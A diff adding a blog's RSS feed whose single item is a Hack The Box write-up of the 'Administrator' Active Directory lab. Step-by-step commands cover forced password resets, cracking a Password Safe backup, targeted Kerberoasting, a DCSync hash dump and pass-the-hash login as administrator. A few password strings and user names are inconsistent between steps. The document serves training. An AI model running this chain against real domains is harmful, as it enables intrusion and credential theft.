@@ -1,0 +1,278 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hack the Box | 0xseclab</title><link>http://localhost:1313/tag/hack-the-box/</link><atom:link href="http://localhost:1313/tag/hack-the-box/index.xml" rel="self" type="application/rss+xml"/><description>Hack the Box</description><generator>Hugo Blox Builder (https://hugoblox.com)</generator><language>en-us</language><lastBuildDate>Mon, 05 May 2025 00:00:00 +0000</lastBuildDate><image><url>http://localhost:1313/media/icon_hu10549305016715957011.png</url><title>Hack the Box</title><link>http://localhost:1313/tag/hack-the-box/</link></image><item><title>Administrator</title><link>http://localhost:1313/blog/administrator-htb/</link><pubDate>Mon, 05 May 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/blog/administrator-htb/</guid><description>&lt;div style="text-align: center; font-size: 2em; font-weight: bold; color: MediumSpringGreen;">
+ADMINISTRATOR-HTB-ACTIVE DIRECTORY
+&lt;/div>
+&lt;h2 id="1-nmap-scan">1. NMAP-SCAN:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -p- -sV -sC --open -oN nmap-administrator Target-IP
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img alt="" srcset="
+/blog/administrator-htb/1-Administrator_hu1989788176023874794.webp 400w,
+/blog/administrator-htb/1-Administrator_hu17992487573682762244.webp 760w,
+/blog/administrator-htb/1-Administrator_hu3923997780253804761.webp 1200w"
+src="http://localhost:1313/blog/administrator-htb/1-Administrator_hu1989788176023874794.webp"
+width="760"
+height="500"
+loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Since initial access was given as :-
+&lt;em>Username:&lt;/em> &lt;strong>Olivia&lt;/strong>
+&lt;em>Password:&lt;/em> &lt;strong>ichliebedich&lt;/strong>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="2-bloodhound">2. BLOODHOUND:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo bloodhound-python -u &lt;span class="s2">&amp;#34;olivia&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;ichliebedich&amp;#34;&lt;/span> -d administrator.htb -c all --zip -ns 10.10.11.42
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Check Olivia&amp;rsquo;s Outbound Object Control:&lt;/strong>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>It can be seen that the user olivia has GenericAll over Michael. Means we can change the password of Michael as Olivia.&lt;/p>
+&lt;h2 id="3-rpclientnet-rpc">3. RPCLIENT/NET RPC:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rpcclient -N  10.10.11.42 -U administrator.htb/&lt;span class="s1">&amp;#39;olivia%ichliebedich&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">setuserinfo michael &lt;span class="m">23&lt;/span> Password123
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div style="text-align: center; font-size: 1.5em; font-weight: bold; color: Golden;">
+OR
+&lt;/div>
+&lt;p>We could:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net rpc password michael Password123 -U administrator.htb/&lt;span class="s1">&amp;#39;olivia%ichliebedich&amp;#39;&lt;/span> -S administrator.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-2.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>This time checking Michael Outbound Object Controls:&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-3.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>It can be seen that the user Michael has &lt;strong>ForceChangePassword&lt;/strong> over Benjamin. Means we can change the password of Michael as Benjamin.&lt;/p>
+&lt;p>Time to change Benjamin password.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net rpc password benjamin Password123 -U administrator.htb/michael%Password123 -S administrator.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Although we changed the password of Benjamin but we cant access Benjamin as Evil-Winrm since he doesn’t have a winrm access. Moreove, wmiexec and psexec also didn’t worked.&lt;/p>
+&lt;h2 id="3-ftp-as-benjamin">3. FTP AS BENJAMIN:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lftp -u administrator.htb&lt;span class="se">\\&lt;/span>benjamin,Password123! 10.10.11.42
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-5.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">dir
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">get Backup.psafe3
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-6.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;blockquote>
+&lt;p>The file is pwsafe format so for that we need to first change it into .txt via pwsafe2john then crack it via john&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="4-cracking-the-pwsafe-file">4. CRACKING THE PWSAFE FILE:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">pwsafe2john Backup.psafe3 &amp;gt; pwhash.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-7.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">john --format&lt;span class="o">=&lt;/span>pwsafe pwhash.txt --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-8.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-9.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>PASSWORD FOR BACKUP FILE: &lt;strong>tekieromucho&lt;/strong>&lt;/p>
+&lt;h2 id="5-access-backuppsafe3-via-pwsafe">5. ACCESS BACKUP.PSAFE3 VIA PWSAFE:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt install passwordsafe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pwsafe Backup.psafe3
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-10.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-11.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-12.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h5 id="we-got-3-users-with-there-passwords-time-to-again-check-bloodhound-for-the-high-target-user">We got 3 users with there passwords. Time to again check bloodhound for the High Target User&lt;/h5>
+&lt;h2 id="5-bloodhound-again">5. BLOODHOUND AGAIN:&lt;/h2>
+&lt;ul>
+&lt;li>Check Emily&lt;/li>
+&lt;li>Outbound Object Control&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-13.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;blockquote>
+&lt;p>Emily has GenericWrite Access over Ethan&lt;/p>
+&lt;/blockquote>
+&lt;blockquote>
+&lt;p>Ethan is a High Value Target&lt;/p>
+&lt;/blockquote>
+&lt;p>Lets Check the Analysis Tab.&lt;/p>
+&lt;ul>
+&lt;li>Find Shortest Path to Domain Admins&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-14.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h4 id="question--1-what-is-genericwrite-access-means-">QUESTION # 1: WHAT IS &lt;em>GENERICWRITE ACCESS&lt;/em> MEANS ?&lt;/h4>
+&lt;p>&lt;code>Permission that allows a subject (user, process, or application) to perform write operations (modify, create, delete) on a resource (file, database, object, etc.) without specific restrictions.&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-15.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h4 id="question--2-how-to-abuse-it-">QUESTION # 2: HOW TO ABUSE IT ?&lt;/h4>
+&lt;p>We have some options for it.&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>Shadow Credentials&lt;/strong>&lt;/li>
+&lt;li>&lt;strong>TargetedKerberoast&lt;/strong>&lt;/li>
+&lt;/ol>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-16.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We are using the 2nd option which is targetedKerberoast.py&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ./targetedKerberoast.py -v -d &lt;span class="s1">&amp;#39;administrator.htb&amp;#39;&lt;/span> -u &lt;span class="s1">&amp;#39;EMILY&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&amp;#39;&lt;/span> --dc-ip 10.10.11.42
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-17.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;em>FOR KERBEROAST TO WORK WE NEED TO HAVE THE SAME DATE AND TIME AS OF THE TARGET. FOR THAT WE CAN USE NTPUPDATE OR MANUALLY CHANGE TIME VIA SMBCLIENT WITH ACCESS&lt;/em>&lt;/p>
+&lt;h2 id="6-ntpupdate">6. NTPUPDATE:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt install ntpdate -y
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo mousepad /etc/ntp.conf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>server 10.10.11.42&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-18.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ntpdate 10.10.11.42
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-19.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div style="text-align: center; font-size: 1.5em; font-weight: bold; color: Golden;">
+OR
+&lt;/div>
+&lt;h5 id="via-smbclient">VIA SMBCLIENT:&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient -L 10.10.11.42 -U &lt;span class="s1">&amp;#39;EMILY%UXLCI5iETUsIBoFVTj8yQFKoHjXmb&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Manually set your system time:&lt;/strong> Once you know the DC&amp;rsquo;s time, manually set your machine&amp;rsquo;s time using:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo date -s &lt;span class="s2">&amp;#34;YYYY-MM-DD HH:MM:SS&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="7-attacking-via-targetedkerberoastpy">7. ATTACKING VIA TARGETEDKERBEROAST.PY:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ./targetedKerberoast.py -v -d &lt;span class="s1">&amp;#39;administrator.htb&amp;#39;&lt;/span> -u &lt;span class="s1">&amp;#39;EMILY&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&amp;#39;&lt;/span> --dc-ip 10.10.11.42
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-20.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-21.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h5 id="switching-back-to-your-local-time-">SWITCHING BACK TO YOUR LOCAL TIME :&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ntpdate pool.ntp.org
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">timedatectl status
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-22.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="8-cracking-the-hash-of-ethan">8. CRACKING THE HASH OF ETHAN:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">13100&lt;/span> ethan.hash /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best64.rule
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-23.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Username: &lt;em>ethan&lt;/em>&lt;br>
+Password: &lt;strong>limpbizket&lt;/strong>&lt;/p>
+&lt;p>Again, we tried evil winrm as ethan but no access.&lt;/p>
+&lt;p>Time to check Ethan privileges.&lt;/p>
+&lt;h5 id="bloodhound">BLOODHOUND:&lt;/h5>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-24.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We can see that the user ethan has &lt;strong>DCSync&lt;/strong> Write over the DC. Hence we can dump its &lt;strong>sam&lt;/strong> &lt;em>impacket-secretsdump.py&lt;/em>&lt;/p>
+&lt;h2 id="9-dumping-the-sam-via-secretsdump-dcsync">9. DUMPING THE SAM VIA SECRETSDUMP (DCSync):&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo impacket-secretsdump &lt;span class="s1">&amp;#39;administrator.htb/ethan:limpbizkit@10.10.11.42&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-25.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-26.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="10-evil-winrm-as-administrator">10. EVIL WINRM AS ADMINISTRATOR:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.42 -u &lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span> -H &lt;span class="s1">&amp;#39;3dc553ce4b9fd20bd016e098d2d2fd2e&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-30.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-31.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h3 id="alhamdulillah">ALHAMDULILLAH&lt;/h3>
+&lt;h5 id="rooted">#ROOTED&lt;/h5></description></item></channel></rss>
